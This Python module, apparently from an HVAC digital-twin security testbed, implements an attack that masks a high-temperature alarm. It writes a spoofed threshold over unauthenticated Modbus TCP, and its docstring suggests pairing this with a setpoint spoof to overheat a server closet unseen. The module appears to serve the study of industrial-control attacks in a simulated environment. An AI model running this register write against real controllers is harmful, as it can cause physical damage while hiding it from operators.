"""Attack scenario #2: masking the high-temp alarm.

The deception scenario from docs/ROADMAP.md Phase 3: rather than touching
the overheat itself, hide the alarm an operator would see -- by spoofing
the *threshold*, not the alarm bit itself. high_temp_alarm is recomputed
honestly from the real temperature every scan and always published
faithfully; CracBangBangProgram never lies about it. What this attack
spoofs is what CracBangBangProgram is comparing against: write an
absurdly high value into alarm_threshold_tenths's accept register and
"temp_tenths >= alarm_threshold_tenths" stops being true no matter how
hot the closet actually gets -- an honest computation over a dishonest
input, not a forced status bit.

(A direct "force high_temp_alarm to a coil" version was considered and
rejected: ModbusSlaveServer.sync() unconditionally re-applies whatever is
standing in an accept register every tick, defaulting to 0/False for any
address nothing has written -- so that coil would read as permanently
masked from tick 1 regardless of any attacker, not just once attacked.
Spoofing the threshold doesn't have that problem: an uncommissioned
threshold defaults to 0, which makes the alarm trip immediately and stay
tripped -- fails loud, not silent. See
examples/server_closet_controlled.toml's [modbus.slave_server] comment.)

Same one-shot-then-persists mechanism as the setpoint spoof, and the same
"no new DigiTwin plumbing" story: this just needs a plain, unauthenticated
holding-register write.

    uv run python -m hvac_twin.attacks.alarm_mask

Pairs naturally with setpoint_spoof.py: spoof the setpoint to actually
cook the closet, then mask the alarm so nothing on the wire shows it.
"""

from __future__ import annotations

import argparse
from typing import Any

from hvac_twin.attacks._client import wait_for_connection

_ALARM_THRESHOLD_ACCEPT_ADDRESS = 3


def mask_alarm(host: str, port: int, threshold_f: float) -> str:
    """Spoof the high-temp alarm's comparison threshold over plain Modbus
    TCP. Returns a human-readable summary; raises ConnectionError/
    RuntimeError rather than exiting the process, so this is safe to call
    from a long-running console, not just a one-shot CLI."""
    from pymodbus.client import ModbusTcpClient

    threshold_tenths = round(threshold_f * 10)
    client: Any = ModbusTcpClient(host, port=port, timeout=2.0)
    try:
        wait_for_connection(client, host, port)
        result = client.write_registers(
            address=_ALARM_THRESHOLD_ACCEPT_ADDRESS, values=[threshold_tenths], device_id=1
        )
        if result.isError():
            raise RuntimeError(f"write failed: {result}")
        return (
            f"masked the high-temp alarm at {host}:{port} by spoofing "
            f"alarm_threshold_tenths -> {threshold_tenths} ({threshold_f:.1f} F) -- "
            "ground truth keeps climbing, the operator sees nothing"
        )
    finally:
        client.close()


def main(argv: list[str] | None = None) -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=5020)
    parser.add_argument(
        "--threshold",
        type=float,
        default=999.0,
        help="spoofed alarm threshold in degrees F (default: 999, i.e. 'never alarm')",
    )
    args = parser.parse_args(argv)

    try:
        print(mask_alarm(args.host, args.port, args.threshold))
    except (ConnectionError, RuntimeError) as exc:
        raise SystemExit(str(exc)) from exc


if __name__ == "__main__":
    main()
